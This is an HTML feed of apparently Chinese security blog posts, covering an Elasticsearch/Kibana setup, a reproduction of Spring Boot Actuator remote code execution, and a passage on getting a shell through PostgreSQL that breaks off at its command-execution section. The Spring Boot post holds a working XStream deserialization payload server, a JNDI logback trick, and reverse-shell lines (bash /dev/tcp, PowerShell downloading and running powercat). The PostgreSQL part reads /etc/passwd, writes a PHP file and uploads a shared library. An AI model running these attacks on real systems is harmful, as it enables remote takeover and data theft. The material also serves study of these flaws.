kibana:7.2.0</span><br><span class="line"></span><br><span class="line">port map :5601</span><br><span class="line">/usr/share/kibana/config -&gt; kibana_config(本地卷)</span><br></pre></td></tr></table></figure><h4 id="4-1-修改配置"><a href="#4-1-修改配置" class="headerlink" title="4.1 修改配置"></a>4.1 修改配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/docker/volumes/kibana_config/_data<span class="comment"># cat kibana.yml</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ** THIS IS AN AUTO-GENERATED FILE **</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Default Kibana configuration for docker target</span></span><br><span class="line">server.name: kibana</span><br><span class="line">server.host: <span class="string">"0"</span></span><br><span class="line"><span class="comment"># 配置host</span></span><br><span class="line">elasticsearch.hosts: [ <span class="string">"http://192.168.123.135:9200"</span> ]</span><br><span class="line">xpack.monitoring.ui.container.elasticsearch.enabled: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志存放</span></span><br><span class="line">logging.dest: /usr/share/kibana/config/kibana-log.txt</span><br></pre></td></tr></table></figure><h4 id="4-2-测试启动"><a href="#4-2-测试启动" class="headerlink" title="4.2 测试启动"></a>4.2 测试启动</h4><p><img src="/images/2019/08/4194996919.png" alt></p><h2 id="0X04-es常用语句"><a href="#0X04-es常用语句" class="headerlink" title="0X04 es常用语句"></a>0X04 es常用语句</h2><p>以下语句均为7.2环境</p><h3 id="1-1-新增索引"><a href="#1-1-新增索引" class="headerlink" title="1.1 新增索引"></a>1.1 新增索引</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUT test1</span><br><span class="line">&#123;</span><br><span class="line">    "mappings" : &#123;</span><br><span class="line">        "properties" : &#123;</span><br><span class="line">            "field1" : &#123; "type" : "text" &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-新增分词索引"><a href="#1-2-新增分词索引" class="headerlink" title="1.2 新增分词索引"></a>1.2 新增分词索引</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">PUT data1</span><br><span class="line">&#123;</span><br><span class="line">  "settings":&#123;</span><br><span class="line">      "analysis":&#123;</span><br><span class="line">         "analyzer":&#123;</span><br><span class="line">            "email_analyzer":&#123; </span><br><span class="line">               "tokenizer":"standard",</span><br><span class="line">               "filter":[</span><br><span class="line">                  "lowercase"</span><br><span class="line">               ]</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    "mappings" : &#123;</span><br><span class="line">        "properties" : &#123;</span><br><span class="line">            "username" : &#123;                 </span><br><span class="line">              "type": "text",</span><br><span class="line">              "analyzer": "ik_max_word",</span><br><span class="line">              "search_analyzer": "ik_smart"</span><br><span class="line">            &#125;,</span><br><span class="line">            "email":&#123;</span><br><span class="line">              "type": "text",</span><br><span class="line">              "analyzer": "email_analyzer",</span><br><span class="line">              "search_analyzer": "email_analyzer"</span><br><span class="line">            &#125;,            </span><br><span class="line">            "sex":&#123;</span><br><span class="line">              "type": "keyword"</span><br><span class="line">            &#125;,</span><br><span class="line">            "address" : &#123;                 </span><br><span class="line">              "type": "text",</span><br><span class="line">              "analyzer": "ik_max_word",</span><br><span class="line">              "search_analyzer": "ik_smart"</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-3-查看索引"><a href="#1-3-查看索引" class="headerlink" title="1.3 查看索引"></a>1.3 查看索引</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.10:9200/_cat/indices</span><br></pre></td></tr></table></figure><h3 id="1-4-查看数据"><a href="#1-4-查看数据" class="headerlink" title="1.4 查看数据"></a>1.4 查看数据</h3><p>查看test1索引下序号为1的数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET test1/_doc/1</span><br></pre></td></tr></table></figure><h3 id="1-5-搜索数据"><a href="#1-5-搜索数据" class="headerlink" title="1.5 搜索数据"></a>1.5 搜索数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.10:9200&#x2F;hello&#x2F;_search?pretty&amp;size&#x3D;50&amp;from&#x3D;50</span><br></pre></td></tr></table></figure><h3 id="1-6-范围删除"><a href="#1-6-范围删除" class="headerlink" title="1.6 范围删除"></a>1.6 范围删除</h3><p>删除data1索引下_seq_no序号大于等于50的数据</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST data1/_delete_by_query</span><br><span class="line">&#123;</span><br><span class="line">  "query": &#123;</span><br><span class="line">    "range" : &#123;</span><br><span class="line">        "_seq_no" : &#123;</span><br><span class="line">           "gte" : 50</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-7-group-by查询"><a href="#1-7-group-by查询" class="headerlink" title="1.7 group by查询"></a>1.7 group by查询</h3><p>检索处所有source字段</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET data1/_search</span><br><span class="line">&#123;</span><br><span class="line">  "aggs":&#123;</span><br><span class="line">    "models":&#123;</span><br><span class="line">      "terms":&#123;</span><br><span class="line">        "field":"source"</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0X05-es常用语句"><a href="#0X05-es常用语句" class="headerlink" title="0X05 es常用语句"></a>0X05 es常用语句</h2><p>Bulk 批量插入</p><p>Mysql To Elasticsearch</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_39198406/article/details/82983256</span><br></pre></td></tr></table></figure><h2 id="0X06-异常报错"><a href="#0X06-异常报错" class="headerlink" title="0X06 异常报错"></a>0X06 异常报错</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELASTICSEARCH CIRCUITBREAKINGEXCEPTION FIELDDATA DATA TOO LARGE</span><br></pre></td></tr></table></figure><p>尝试添加文章中配置文件限制cache的配置<br>其次top看一下内存占用，应该是不够用了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近分析一些日志，搭建elasticsearch+kibana玩一玩。&lt;/p&gt;
    
    </summary>
    
    
      <category term="环境搭建" scheme="http://yoursite.com/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>Spring Boot Actuators配置不当导致RCE漏洞复现</title>
    <link href="http://yoursite.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-03-12T12:16:20.000Z</published>
    <updated>2020-04-08T02:18:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>漏洞分析源地址：<br><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators" target="_blank" rel="external nofollow noopener noreferrer">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></p><a id="more"></a><p>关于springboot监控可以参考以下文章：<br><a href="https://www.freebuf.com/news/193509.html" target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/news/193509.html</a></p><p>测试环境，原作者提供的github：<br><a href="https://github.com/artsploit/actuator-testbed" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/artsploit/actuator-testbed</a></p><p>复现过程：</p><h4 id="1-Remote-Code-Execution-via-‘-jolokia’"><a href="#1-Remote-Code-Execution-via-‘-jolokia’" class="headerlink" title="1.Remote Code Execution via ‘/jolokia’"></a>1.Remote Code Execution via ‘/jolokia’</h4><p>前置条件：<br>在jolokia/list目录检索存在logback组件,则可以使用jolokia远程包含logback.xml配置文件，直接执行远程引用字节码：<br><a href="http://127.0.0.1:9090/jolokia/list" target="_blank" rel="external nofollow noopener noreferrer">http://127.0.0.1:9090/jolokia/list</a><br><img src="/images/2019/03/4140320665.png" alt></p><p>1）在VPS上创建logback.xml，logback中填写jndi服务，当调用时直接触发恶意class。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;insertFromJNDI env-entry-name=<span class="string">"ldap://vps_ip:1389/jndi"</span> as=<span class="string">"appName"</span> /&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/2019/03/1172285257.png" alt></p><p>2）创建反弹shell的恶意class,并监听端口8081<br>javac Exploit.java -&gt; Exploit.class<br><img src="/images/2019/03/3849118789.png" alt><br>3）利用marshalsec创建jndi server地址指向恶意class监听的端口8081：<br><img src="/images/2019/03/1439155234.png" alt><br>4）监听反弹shell端口：</p><p>4）访问springboot以下链接触发远程访问VPS地址logback.xml：<br><a href="http://127.0.0.1:9090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS地址:8080!/logback.xml" target="_blank" rel="external nofollow noopener noreferrer">http://127.0.0.1:9090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS地址:8080!/logback.xml</a><br>触发回显2333端口接收到主机whomai结果：<br><img src="/images/2019/10/420084106.png" alt></p><h4 id="2-Config-modification-via-‘-env’"><a href="#2-Config-modification-via-‘-env’" class="headerlink" title="2. Config modification via ‘/env’"></a>2. Config modification via ‘/env’</h4><p>当第一种找不到logback配置可以尝试修改env配置文件进行xstream反序列化<br>前置条件：<br>Eureka-Client &lt;1.8.7（多见于Spring Cloud Netflix）<br>比如测试前台json报错泄露包名就是使用netflix：<br><img src="/images/2019/03/1695128671.png" alt><br>需要以下2个包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spring-boot-starter-actuator（/refresh刷新配置需要）</span><br><span class="line">spring-cloud-starter-netflix-eureka-client（功能依赖）</span><br></pre></td></tr></table></figure><p>1）在VPS创建xstream文件，使用flask返回application/xml格式数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/3/12 10:06</span></span><br><span class="line"><span class="comment"># @Author  : j1anFen</span></span><br><span class="line"><span class="comment"># @Site    :</span></span><br><span class="line"><span class="comment"># @File    : run.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># linux反弹shell bash -i &gt;&amp;amp; /dev/tcp/192.168.20.82/9999 0&gt;&amp;amp;1</span></span><br><span class="line"><span class="comment"># windows反弹shell</span></span><br><span class="line"><span class="comment"># &lt;string&gt;powershell&lt;/string&gt;</span></span><br><span class="line"><span class="comment"># &lt;string&gt;IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');&lt;/string&gt;</span></span><br><span class="line"><span class="comment"># &lt;string&gt;powercat -c 192.168.123.1 -p 2333 -e cmd&lt;/string&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', defaults=&#123;'path': ''&#125;)</span></span><br><span class="line"><span class="meta">@app.route('/&lt;path:path&gt;', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span><span class="params">(path)</span>:</span></span><br><span class="line">    xml = <span class="string">"""&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"&gt;</span></span><br><span class="line"><span class="string">          &lt;is class="javax.crypto.CipherInputStream"&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class="javax.crypto.NullCipher"&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class="javax.imageio.spi.FilterIterator"&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class="javax.imageio.spi.FilterIterator"&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class="java.util.Collections$EmptyIterator"/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class="java.lang.ProcessBuilder"&gt;</span></span><br><span class="line"><span class="string">                    &lt;command&gt;</span></span><br><span class="line"><span class="string">&lt;string&gt;powershell&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;string&gt;IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;powercat -c [vps地址] -p 2333 -e cmd&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class="javax.imageio.ImageIO$ContainsFilter"&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next class="string"&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class="java.lang.ProcessBuilder$NullInputStream"/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;"""</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">'application/xml'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'172.31.245.127'</span>, port=<span class="number">2333</span>)</span><br></pre></td></tr></table></figure><p>2）启动服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_xstream.py</span><br></pre></td></tr></table></figure><p>3）写入配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /env HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:9090</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 68</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://vps:2333/xstream</span><br></pre></td></tr></table></figure><p><img src="/images/2019/03/134312817.png" alt></p><p>刷新触发[POST]：<br><strong>一般情况需要等待3秒会有响应包，如果立即返回可能是服务缺少spring-boot-starter-actuator扩展包无法刷新漏洞则无法利用。</strong><br><img src="/images/2019/03/3068556996.png" alt><br>获取反弹shell：<br><img src="/images/2019/03/3495674142.png" alt></p><h3 id="安全措施可参考："><a href="#安全措施可参考：" class="headerlink" title="安全措施可参考："></a>安全措施可参考：</h3><p><a href="https://xz.aliyun.com/t/2233" target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/2233</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;漏洞分析源地址：&lt;br&gt;&lt;a href=&quot;https://www.veracode.com/blog/research/exploiting-spring-boot-actuators&quot; target=&quot;_blank&quot; rel=&quot;external nofollow noopener noreferrer&quot;&gt;https://www.veracode.com/blog/research/exploiting-spring-boot-actuators&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>渗透中利用postgresql getshell</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8postgresql%20getshell/"/>
    <id>http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8postgresql%20getshell/</id>
    <published>2018-01-06T14:14:23.000Z</published>
    <updated>2020-04-08T02:18:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>学习postgresql数据库如何getshell是在渗透中遇到一个pgAdmin的web管理页面可以直接操作postgresql且通过网上的文章没有达到9.6版本getshell的效果所以便有了以下文章。<strong>解决新版本写入函数so文件创建函数失败问题.</strong></p><a id="more"></a><h2 id="0x01-postgresql测试环境搭建"><a href="#0x01-postgresql测试环境搭建" class="headerlink" title="0x01 postgresql测试环境搭建"></a>0x01 postgresql测试环境搭建</h2><p>安装过程: devel库一定要安装后面用来编译后面需要扩展库postgres.h</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install postgresql96-server postgresql96-contrib postgresql-devel  postgresql-libs</span><br></pre></td></tr></table></figure><p>postgresql默认不支持用root启动所以需要建立用户:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">useradd postgres</span><br><span class="line">passwd postgres</span><br></pre></td></tr></table></figure><p>然后需要建立一个data目录并给postgres用户为所有者权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/pgsql-9.6/data</span><br><span class="line">chown -R postgres /usr/pgsql-9.6/data</span><br></pre></td></tr></table></figure><p>然后在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/pgsql-9.6/bin/initdb 初始数据库(必须做)</span><br></pre></td></tr></table></figure><p>启动数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/pgsql-9.6/bin/pg_ctl -D /usr/pgsql-9.6/data -l logfile start</span><br></pre></td></tr></table></figure><p>关闭数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/pgsql-9.6/bin/pg_ctl stop</span><br></pre></td></tr></table></figure><p>进入数据库命令行界面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psql -d template1</span><br></pre></td></tr></table></figure><p>创建数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE postgre;</span><br></pre></td></tr></table></figure><p>查看密码 密码=MD5(user+password)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT usename, passwd FROM pg_shadow;</span><br></pre></td></tr></table></figure><h2 id="0x02-读写文件"><a href="#0x02-读写文件" class="headerlink" title="0x02 读写文件"></a>0x02 读写文件</h2><p>因为和mysql一样利用UDF进行提权所以需要上传文件</p><h4 id="1-读文件"><a href="#1-读文件" class="headerlink" title="1.读文件"></a>1.读文件</h4><h5 id="1-1-创建数据表把读到的文件copy入表"><a href="#1-1-创建数据表把读到的文件copy入表" class="headerlink" title="1.1 创建数据表把读到的文件copy入表:"></a>1.1 创建数据表把读到的文件copy入表:</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> wooyun;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> wooyun(t <span class="built_in">TEXT</span>);</span><br><span class="line">COPY wooyun FROM '/etc/passwd';</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> wooyun <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h5 id="1-2-利用postgresql大对象处理来读文件"><a href="#1-2-利用postgresql大对象处理来读文件" class="headerlink" title="1.2 利用postgresql大对象处理来读文件:"></a>1.2 利用postgresql大对象处理来读文件:</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> lo_import(<span class="string">'/etc/passwd'</span>,<span class="number">12345678</span>);</span><br><span class="line"><span class="keyword">select</span> array_agg(b)::<span class="built_in">text</span>::<span class="built_in">int</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">encode</span>(<span class="keyword">data</span>,<span class="string">'hex'</span>)b,pageno <span class="keyword">from</span> pg_largeobject <span class="keyword">where</span> loid=<span class="number">12345678</span> <span class="keyword">order</span> <span class="keyword">by</span> pageno)a</span><br></pre></td></tr></table></figure><h4 id="2-写文件"><a href="#2-写文件" class="headerlink" title="2.写文件"></a>2.写文件</h4><h5 id="2-1-普通文件写入-webshell"><a href="#2-1-普通文件写入-webshell" class="headerlink" title="2.1 普通文件写入(webshell):"></a>2.1 普通文件写入(webshell):</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COPY (<span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span>) <span class="keyword">to</span> <span class="string">'/tmp/1.php'</span>;</span><br></pre></td></tr></table></figure><h5 id="2-2-二进制文件写入-利用大数据对象"><a href="#2-2-二进制文件写入-利用大数据对象" class="headerlink" title="2.2 二进制文件写入(利用大数据对象):"></a>2.2 二进制文件写入(利用大数据对象):</h5><p>这里需要分片进行上传就是将文件分成小于等于2KB大小的hex再进行上传,但是在9.6版本中(我测试的版本)必须切割<strong>等于2KB的数据上传才会成功</strong>,具体到命令执行处详细说明.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR:  pg_largeobject entry for OID 2008, page 0 has invalid data field size 2378</span><br></pre></td></tr></table></figure><p>首先创建一个OID作为写入的对象,然后通过0,1,2,3…分片上传但是对象都为12345最后导出到/tmp目录下,收尾删除OID</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">12345</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">0</span>, <span class="keyword">decode</span>(<span class="string">'7f454c4...0000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">1</span>, <span class="keyword">decode</span>(<span class="string">'0000000...0000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">2</span>, <span class="keyword">decode</span>(<span class="string">'f604000...0000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">3</span>, <span class="keyword">decode</span>(<span class="string">'0000000...7400'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">12345</span>, <span class="string">'/tmp/test.so'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> lo_unlink(<span class="number">12345</span>);</span><br></pre></td></tr></table></figure><h2 id="0x03-命令执行"><a href="#0x03-命令执行" class="headerlink" title="0x03 命令执行"></a>0x03 命令执行</h2><h5 id="1-1-低版本的命令执行"><a href="#1-1-低版本的命令执行" class="headerlink" title="1.1 低版本的命令执行"></a>1.1 